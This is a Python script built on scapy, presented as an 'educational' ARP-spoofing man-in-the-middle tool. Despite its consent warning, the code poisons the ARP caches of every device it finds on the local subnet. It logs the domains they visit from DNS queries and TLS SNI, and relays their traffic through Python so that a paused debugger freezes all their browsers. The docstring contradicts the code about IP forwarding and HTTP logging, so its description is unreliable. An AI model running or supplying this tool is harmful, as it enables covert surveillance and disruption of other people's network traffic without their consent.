#!/usr/bin/env python3
"""
ARP Spoofing + Forwarding MITM Tool (educational project)
-----------------------------------------------------------
Use this ONLY on your own network/devices, or with explicit permission
from anyone whose traffic you're intercepting. ARP spoofing intercepts
other people's network traffic and can be illegal without consent,
even on a home WiFi network you administer.

What it does:
1. Sends spoofed ARP replies to the target (e.g. your father's laptop)
   saying "I am the router" (your MAC mapped to the gateway IP).
2. Sends spoofed ARP replies to the gateway/router saying
   "I am the target" (your MAC mapped to the target's IP).
3. Enables IP forwarding on your machine so traffic still reaches
   the internet (otherwise you just cut their connection).
4. Sniffs/logs plaintext HTTP requests passing through your machine.
   HTTPS traffic (most sites today) will just look like encrypted noise.
5. Restores the real ARP tables when you stop the script (Ctrl+C),
   so you don't leave the network broken.

Requirements:
    pip install scapy

Usage (needs root/admin privileges):
    sudo python3 arp_mitm.py --target 192.168.1.50 --gateway 192.168.1.1

Find your gateway IP with: ip route  (Linux/Mac)  or  ipconfig  (Windows)
Find devices on your network with: arp -a, or an app like Fing.
"""

import sys
import time
import threading
import logging
from scapy.all import ARP, Ether, srp, sendp, sniff, IP, TCP, Raw, conf, get_if_hwaddr, get_if_addr
from scapy.all import DNS
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)


def get_mac(ip):
    """Resolve the MAC address for a given IP using ARP, with system arp cache fallback."""
    import subprocess, re
    from scapy.all import conf

    iface = conf.iface  # auto-detected active interface
    arp_request = ARP(pdst=ip)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request
    answered = srp(packet, iface=iface, timeout=5, retry=2, verbose=False)[0]
    if answered:
        return answered[0][1].hwsrc

    # Fallback: ping then read system ARP cache
    subprocess.run(["ping", "-c", "1", "-W", "1", ip],
                   stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    result = subprocess.run(["arp", "-n", ip], capture_output=True, text=True)
    match = re.search(r"(([0-9a-f]{1,2}[:\-]){5}[0-9a-f]{1,2})", result.stdout, re.I)
    if match:
        return match.group(1)

    raise ValueError(f"Could not resolve MAC for {ip}. Is it online and on the same subnet?")


def scan_network(subnet, iface, my_ip, gateway_ip):
    """ARP-scan the subnet and return {ip: mac} of live hosts.

    Excludes our own machine and the gateway (the gateway is handled
    separately as the spoof partner).
    """
    import subprocess, re, ipaddress

    print(f"[*] Scanning {subnet} for connected devices...")
    hosts = {}

    # 1) Fast scapy ARP scan.
    arp_request = ARP(pdst=subnet)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    answered = srp(broadcast / arp_request, iface=iface,
                   timeout=5, retry=3, verbose=False)[0]
    for _, reply in answered:
        hosts[reply.psrc] = reply.hwsrc

    # 2) Fallback for macOS WiFi: ping-sweep to populate the system ARP cache,
    #    then read it. Helps when broadcast ARP scans get dropped.
    if len(hosts) <= 1:
        print("[*] ARP scan thin — running a ping sweep (this takes a few seconds)...")
        net = ipaddress.ip_network(subnet, strict=False)
        procs = [subprocess.Popen(["ping", "-c", "1", "-W", "200", str(ip)],
                                  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                 for ip in net.hosts()]
        for p in procs:
            p.wait()
        out = subprocess.run(["arp", "-a", "-n"], capture_output=True, text=True).stdout
        for line in out.splitlines():
            m = re.search(r"\(([\d.]+)\) at ([0-9a-f:]{17})", line, re.I)
            if m:
                hosts[m.group(1)] = m.group(2)

    # Exclude ourselves and the gateway.
    hosts.pop(my_ip, None)
    hosts.pop(gateway_ip, None)
    return hosts


def spoof(target_ip, target_mac, spoof_ip, my_mac, iface):
    """Tell target_ip that spoof_ip lives at OUR mac address."""
    pkt = (Ether(dst=target_mac, src=my_mac) /
           ARP(op=2, pdst=target_ip, hwdst=target_mac,
               psrc=spoof_ip, hwsrc=my_mac))
    sendp(pkt, iface=iface, verbose=False)


def restore(target_ip, target_mac, real_ip, real_mac, my_mac, iface):
    """Tell target_ip the TRUE mapping of real_ip -> real_mac."""
    pkt = (Ether(dst=target_mac, src=my_mac) /
           ARP(op=2, pdst=target_ip, hwdst=target_mac,
               psrc=real_ip, hwsrc=real_mac))
    sendp(pkt, iface=iface, count=4, verbose=False)


def set_ip_forwarding(enabled):
    """Toggle the KERNEL's IP forwarding. We turn it OFF so that forwarding is
    done by our Python loop instead (lets a debugger pause stall the network)."""
    import platform, os
    val = "1" if enabled else "0"
    if platform.system() == "Linux":
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write(val)
    elif platform.system() == "Darwin":
        os.system(f"sysctl -w net.inet.ip.forwarding={val}")
    else:
        print("Windows: toggle forwarding via "
              "'netsh interface ipv4 set interface <name> forwarding=<enabled|disabled>'")


def extract_sni(data):
    """Parse the SNI hostname out of a raw TLS ClientHello, or return None."""
    try:
        # Must look like a TLS handshake record: 0x16 0x03 0x0X
        if len(data) < 6 or data[0] != 0x16 or data[1] != 0x03:
            return None
        # Handshake message type must be ClientHello (0x01)
        if data[5] != 0x01:
            return None

        i = 43  # record(5) + hs hdr(4) + client_version(2) + random(32)
        if i >= len(data):
            return None
        sid_len = data[i]; i += 1 + sid_len            # session id
        cs_len = int.from_bytes(data[i:i+2], "big"); i += 2 + cs_len   # cipher suites
        cm_len = data[i]; i += 1 + cm_len              # compression methods
        if i + 2 > len(data):
            return None
        ext_total = int.from_bytes(data[i:i+2], "big"); i += 2
        end = min(len(data), i + ext_total)

        while i + 4 <= end:
            ext_type = int.from_bytes(data[i:i+2], "big")
            ext_len = int.from_bytes(data[i+2:i+4], "big")
            i += 4
            if ext_type == 0x00:  # server_name extension
                # server_name_list(2) name_type(1) name_len(2) name(...)
                name_len = int.from_bytes(data[i+3:i+5], "big")
                return data[i+5:i+5+name_len].decode(errors="ignore")
            i += ext_len
        # Saw a ClientHello but no SNI (ECH / no SNI sent)
        return "<ClientHello, no SNI>"
    except Exception:
        return None



NOISE_DOMAINS = {
    "adguard-dns.com", "googleadservices.com", "doubleclick.net",
    "googlesyndication.com", "google-analytics.com", "googletagmanager.com",
    "ttcache.com", "tsyndicate.com", "orbsrv.com", "uuidksinc.net",
    "pxltag.com", "crashlytics.com", "scorecardresearch.com", "fullstory.com",
    "quantserve.com", "clarity.ms", "tvsquared.com", "arttrk.com",
    "liveperson.net", "hcaptcha.com", "openfpcdn.io", "wsimg.com",
}


def is_noise(host):
    return root_domain(host) in NOISE_DOMAINS


# Multi-part public suffixes so we don't truncate e.g. bbc.co.uk -> co.uk
_MULTI_TLD = (
    "co.uk", "org.uk", "ac.uk", "gov.uk", "co.in", "co.jp", "com.au",
    "co.nz", "com.br", "co.za", "com.sg", "com.hk",
)


def root_domain(host):
    """Collapse a hostname to its registered domain (eTLD+1)."""
    host = host.rstrip(".").lower()
    parts = host.split(".")
    if len(parts) <= 2:
        return host
    last2 = ".".join(parts[-2:])
    if last2 in _MULTI_TLD:
        return ".".join(parts[-3:])
    return last2


def make_callback(targets, hosts, gateway_ip, gateway_mac, my_mac, my_ip, iface):
    """Sniff callback that BOTH logs domains AND manually forwards packets.

    Because forwarding happens here in Python (kernel IP forwarding is OFF),
    pausing your debugger anywhere in this function freezes all traffic for
    the spoofed devices — their browsers just keep loading until you continue.
    """
    def show(tag, src, host):
        if not host.startswith("www."):
            return
        if is_noise(host):
            return
        print(f"[{src}] [{tag}] {host}")

    def forward(pkt):
        """Relay a packet that was diverted to us toward its real destination."""
        if not pkt.haslayer(Ether) or not pkt.haslayer(IP):
            return
        # Only forward frames addressed to our MAC (i.e. diverted by ARP spoof),
        # and never our own traffic.
        if pkt[Ether].dst != my_mac:
            return
        ip_src, ip_dst = pkt[IP].src, pkt[IP].dst
        if ip_src == my_ip or ip_dst == my_ip:
            return

        # Decide the real next-hop MAC.
        if ip_dst in hosts:
            next_mac = hosts[ip_dst]          # reply heading back to a device
        elif ip_src in targets:
            next_mac = gateway_mac            # request heading out to the internet
        else:
            return

        # Rewrite L2 addressing and re-inject. Keep the IP payload untouched.
        pkt[Ether].src = my_mac
        pkt[Ether].dst = next_mac
        sendp(pkt, iface=iface, verbose=False)

    def packet_callback(pkt):
        # 1) Log domains for traffic originating from a monitored device.
        if pkt.haslayer(IP) and pkt[IP].src in targets:
            src = pkt[IP].src
            if pkt.haslayer(DNS) and pkt[DNS].qr == 0 and pkt[DNS].qd is not None:
                qd = pkt[DNS].qd
                for rec in (qd if isinstance(qd, list) else [qd]):
                    try:
                        show("DNS", src, rec.qname.decode(errors="ignore").rstrip("."))
                    except Exception:
                        pass
            if pkt.haslayer(TCP) and pkt.haslayer(Raw):
                sni = extract_sni(bytes(pkt[Raw].load))
                if sni and not sni.startswith("<"):
                    show("SNI", src, sni)

        # 2) Manually forward — THIS is the line that, when paused, hangs browsers.
        forward(pkt)

    return packet_callback


def detect_gateway():
    """Read the default gateway IP from the system routing table."""
    import subprocess, re, platform
    if platform.system() == "Darwin":
        out = subprocess.run(["route", "-n", "get", "default"],
                             capture_output=True, text=True).stdout
        m = re.search(r"gateway:\s*([\d.]+)", out)
    else:  # Linux
        out = subprocess.run(["ip", "route"], capture_output=True, text=True).stdout
        m = re.search(r"default via ([\d.]+)", out)
    return m.group(1) if m else None


def main():
    iface = conf.iface
    my_mac = get_if_hwaddr(iface)
    my_ip = get_if_addr(iface)
    print(f"[*] Using interface {iface}  (our IP: {my_ip}, MAC: {my_mac})")

    # Auto-detect gateway + subnet from the actual network we're on.
    gateway_ip = detect_gateway()
    if not gateway_ip:
        print("[!] Could not detect the gateway. Set gateway_ip manually.")
        sys.exit(1)
    subnet = ".".join(my_ip.split(".")[:3]) + ".0/24"
    print(f"[*] Detected gateway {gateway_ip}, subnet {subnet}")

    gateway_mac = get_mac(gateway_ip)
    print(f"[*] Gateway {gateway_ip} -> {gateway_mac}")

    # Discover everything currently on the network.
    hosts = scan_network(subnet, iface, my_ip, gateway_ip)
    if not hosts:
        print("[!] No other devices found. Exiting.")
        sys.exit(1)
    for ip, mac in hosts.items():
        print(f"    [+] {ip:<15} {mac}")

    # Turn OFF kernel forwarding — our Python callback does the relaying now.
    set_ip_forwarding(False)
    print(f"[*] Kernel forwarding OFF. Python is the relay. Spoofing {len(hosts)} "
          f"device(s) (Ctrl+C to stop)...")
    print("[*] TIP: set a breakpoint inside forward() — while paused, every "
          "spoofed browser will hang on 'loading'.")

    # Sniff ALL IP traffic (we must forward everything, not just web/DNS).
    targets = set(hosts.keys())
    cb = make_callback(targets, hosts, gateway_ip, gateway_mac, my_mac, my_ip, iface)
    threading.Thread(
        target=lambda: sniff(iface=iface, filter="ip", prn=cb, store=False),
        daemon=True,
    ).start()

    try:
        while True:
            for ip, mac in list(hosts.items()):
                # Tell the device we are the gateway...
                spoof(ip, mac, gateway_ip, my_mac, iface)
                # ...and tell the gateway we are the device.
                spoof(gateway_ip, gateway_mac, ip, my_mac, iface)
            time.sleep(2)
    except KeyboardInterrupt:
        print("\n[*] Restoring ARP tables, please wait...")
        for ip, mac in hosts.items():
            restore(ip, mac, gateway_ip, gateway_mac, my_mac, iface)
            restore(gateway_ip, gateway_mac, ip, mac, my_mac, iface)
        set_ip_forwarding(False)
        print("[*] Done.")
        sys.exit(0)


if __name__ == "__main__":
    main()